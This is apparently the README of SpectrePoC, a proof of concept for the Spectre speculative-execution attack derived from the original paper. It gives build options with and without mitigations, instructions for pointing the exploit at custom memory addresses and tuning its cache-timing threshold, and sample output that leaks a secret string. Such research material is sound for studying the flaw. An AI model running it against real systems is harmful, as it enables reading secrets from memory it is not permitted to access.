# SpectrePoC

Proof of concept code for the Spectre CPU exploit.

## Attribution

The source code originates from the example code provided in the "Spectre Attacks: Exploiting Speculative Execution" paper found here:

https://spectreattack.com/spectre.pdf

The original source code used in this repository was conveniently provided by Erik August's gist, found here: https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6

The code has been modified to fix build issues, add workaround for older CPUs, and improve comments where possible.

## Building

The project can be built with GNU Make and GCC.

On debian these are included in the `build-essential` metapackage.

Building is as easy as:

`cd SpectrePoC`

`make`

The output binary is `./spectre.out`.

### Intel lfence style mitigation

If you want to build a version with Intel's lfence mitigation included, set your `CFLAGS`

`CFLAGS=-DMITIGATION`

in the `Makefile` or build like

`CFLAGS=-DMITIGATION make`

The output binary will still be in `./spectre.out`.

### Linux kernel style mitigation

If you want to build a version with Linux kernel array_index_mask_nospec() mitigation included, set your `CFLAGS`

`CFLAGS=-DLINUX_KERNEL_MITIGATION`

in the `Makefile` or build like

`CFLAGS=-DLINUX_KERNEL_MITIGATION make`

The output binary will still be in `./spectre.out`.

### Building for older CPUs

Depending on the CPU, certain instructions will need to be disabled in order for the program to run correctly.

The instructions in question are:

#### rdtscp:

Introduced with x86-64.
All 32-bit only CPUs, including many Core 2 Duos, will need to disable this instruction.

To build the project without `rdtscp`, define the NORDTSCP cflag:

`CFLAGS=-DNORDTSCP make` 

#### mfence:
Introduced with SSE2.
Most CPUs pre-Pentium 4 will need to disable this instruction.

To build the project without `mfence`, define the NOMFENCE cflag:

`CFLAGS=-DNOMFENCE make`

#### clflush
Introduced with SSE2.
Most CPUs pre-Pentium 4 will need to disable this instruction.

To build the project without `clflush`, define the NOCLFLUSH cflag:

`CFLAGS=-DNOCLFLUSH make`

#### Multiple cflags

To define multiple cflags, separate each cflag with an escaped space. For example:

`CFLAGS=-DNORDTSCP\ -DNOMFENCE\ -DNOCLFLUSH make`

#### SSE2 instruction set

To build the project without all of the above instructions introduced with SSE2, define NOSSE2 cflag:

`CFLAGS=-DNOSSE2 make`

#### 'Target specific option mismatch' error

Some 32-bit versions of gcc (e.g. the version used in Ubuntu 14.04) may show the following error while compiling the PoC:

```
/usr/lib/gcc/i686-linux-gnu/5/include/emmintrin.h:1479:1: error:
  inlining failed in call to always_inline
`_mm_clflush`: target specific option mismatch
 _mm_clflush (void const *__A)
 ^
```

In this case architecture build flag `-march=native` is required for compilation for the current CPU:

`CFLAGS=-march=native make`

This flag builds the binary specifically for the current CPU and it may crash after copying to another machine.

### Building it without using the Makefile

If you want to build it manually, make sure to disable all optimisations (aka, don't use -O2), as it will break the program.

## Executing

To run spectre with default cache hit threshold of 80, and the secret example string "The Magic Words are Squeamish Ossifrage." as the target, run `./spectre.out` with no command line arguments.

**Example:** `./spectre.out`

The cache hit threshold can be specified as the first command line argument. It must be a whole positive integer.

**Example:** `./spectre.out 80`

A custom target address and length can be given as the second and third command line arguments, respectively.

**Example:** `./spectre.out 80 12345678 128`

## Tweaking

If you're getting lackluster results, you may need to tweak the cache hit threshold. This can be done by providing a threshold as the first command line argument.

While a value of 80 appears to work for most desktop CPUs, a larger value may be required for slower CPUs, and the newest desktop CPUs can go as low as 15.
For example, on an Intel(R) Core(TM) i7-8650U CPU (Surface Book 2), a value of 20 works well. On a slower, integrated AMD GX-412TC SOC (PC Engines APU3), a value of 100-300 was required to get a good result.

## Contributing

Feel free to add your results to the "Results" issue. Include your cache hit threshold, OS details, CPU details like vendor Id, family, model name, stepping, microcode, MHz, and cache size. The OS can be found by running `uname -a`. CPU info can be found by running `cat /proc/cpuinfo` on Linux, and `sysctl -a | grep machdep.cpu` on OSX.

## Example output

The following was output on an Intel(R) Core(TM) i7-8650U CPU, with a cache hit threshold of 20:

`./spectre.out 20:`

```
Version: commit 9337eaa1d5878ac761a4378a406ace99785a573b
Using a cache hit threshold of 20.
Build: RDTSCP_SUPPORTED MFENCE_SUPPORTED CLFLUSH_SUPPORTED MITIGATION_DISABLED
Reading 40 bytes:
Reading at malicious_x = 0xffffffffffdfee88... Unclear: 0x54=’T’ score=865 (second best: 0x00=’?’ score=473)
Reading at malicious_x = 0xffffffffffdfee89... Success: 0x68=’h’ score=101 (second best: 0x00=’?’ score=48)
Reading at malicious_x = 0xffffffffffdfee8a... Success: 0x65=’e’ score=47 (second best: 0x00=’?’ score=21)
Reading at malicious_x = 0xffffffffffdfee8b... Success: 0x20=’ ’ score=729 (second best: 0x00=’?’ score=362)
Reading at malicious_x = 0xffffffffffdfee8c... Success: 0x4D=’M’ score=2
Reading at malicious_x = 0xffffffffffdfee8d... Success: 0x61=’a’ score=481 (second best: 0x00=’?’ score=236)
Reading at malicious_x = 0xffffffffffdfee8e... Success: 0x67=’g’ score=851 (second best: 0x00=’?’ score=423)
Reading at malicious_x = 0xffffffffffdfee8f... Unclear: 0x69=’i’ score=915 (second best: 0x6A=’j’ score=506)
Reading at malicious_x = 0xffffffffffdfee90... Success: 0x63=’c’ score=25 (second best: 0x05=’?’ score=10)
Reading at malicious_x = 0xffffffffffdfee91... Success: 0x20=’ ’ score=65 (second best: 0x00=’?’ score=26)
Reading at malicious_x = 0xffffffffffdfee92... Success: 0x57=’W’ score=215 (second best: 0x00=’?’ score=105)
Reading at malicious_x = 0xffffffffffdfee93... Success: 0x6F=’o’ score=95 (second best: 0x05=’?’ score=45)
Reading at malicious_x = 0xffffffffffdfee94... Success: 0x72=’r’ score=59 (second best: 0x00=’?’ score=27)
Reading at malicious_x = 0xffffffffffdfee95... Success: 0x64=’d’ score=2
Reading at malicious_x = 0xffffffffffdfee96... Success: 0x73=’s’ score=209 (second best: 0x05=’?’ score=102)
Reading at malicious_x = 0xffffffffffdfee97... Success: 0x20=’ ’ score=173 (second best: 0x05=’?’ score=84)
Reading at malicious_x = 0xffffffffffdfee98... Success: 0x61=’a’ score=83 (second best: 0x62=’b’ score=39)
Reading at malicious_x = 0xffffffffffdfee99... Unclear: 0x72=’r’ score=802 (second best: 0x05=’?’ score=582)
Reading at malicious_x = 0xffffffffffdfee9a... Success: 0x65=’e’ score=187 (second best: 0x05=’?’ score=91)
Reading at malicious_x = 0xffffffffffdfee9b... Success: 0x20=’ ’ score=107 (second best: 0x05=’?’ score=51)
Reading at malicious_x = 0xffffffffffdfee9c... Success: 0x53=’S’ score=121 (second best: 0x05=’?’ score=58)
Reading at malicious_x = 0xffffffffffdfee9d... Success: 0x71=’q’ score=19 (second best: 0x05=’?’ score=7)
Reading at malicious_x = 0xffffffffffdfee9e... Unclear: 0x75=’u’ score=23 (second best: 0x00=’?’ score=13)
Reading at malicious_x = 0xffffffffffdfee9f... Success: 0x65=’e’ score=39 (second best: 0x05=’?’ score=17)
Reading at malicious_x = 0xffffffffffdfeea0... Success: 0x61=’a’ score=29 (second best: 0x00=’?’ score=12)
Reading at malicious_x = 0xffffffffffdfeea1... Success: 0x6D=’m’ score=21 (second best: 0x05=’?’ score=8)
Reading at malicious_x = 0xffffffffffdfeea2... Success: 0x69=’i’ score=635 (second best: 0x6A=’j’ score=315)
Reading at malicious_x = 0xffffffffffdfeea3... Success: 0x73=’s’ score=2
Reading at malicious_x = 0xffffffffffdfeea4... Success: 0x68=’h’ score=459 (second best: 0x00=’?’ score=228)
Reading at malicious_x = 0xffffffffffdfeea5... Success: 0x20=’ ’ score=23 (second best: 0x05=’?’ score=9)
Reading at malicious_x = 0xffffffffffdfeea6... Success: 0x4F=’O’ score=95 (second best: 0x05=’?’ score=45)
Reading at malicious_x = 0xffffffffffdfeea7... Success: 0x73=’s’ score=145 (second best: 0x00=’?’ score=70)
Reading at malicious_x = 0xffffffffffdfeea8... Success: 0x73=’s’ score=337 (second best: 0x05=’?’ score=166)
Reading at malicious_x = 0xffffffffffdfeea9... Success: 0x69=’i’ score=191 (second best: 0x00=’?’ score=93)
Reading at malicious_x = 0xffffffffffdfeeaa... Success: 0x66=’f’ score=2
Reading at malicious_x = 0xffffffffffdfeeab... Success: 0x72=’r’ score=91 (second best: 0x00=’?’ score=43)
Reading at malicious_x = 0xffffffffffdfeeac... Success: 0x61=’a’ score=19 (second best: 0x05=’?’ score=7)
Reading at malicious_x = 0xffffffffffdfeead... Success: 0x67=’g’ score=91 (second best: 0x00=’?’ score=44)
Reading at malicious_x = 0xffffffffffdfeeae... Success: 0x65=’e’ score=93 (second best: 0x05=’?’ score=44)
Reading at malicious_x = 0xffffffffffdfeeaf... Success: 0x2E=’.’ score=121 (second best: 0x00=’?’ score=58)
```
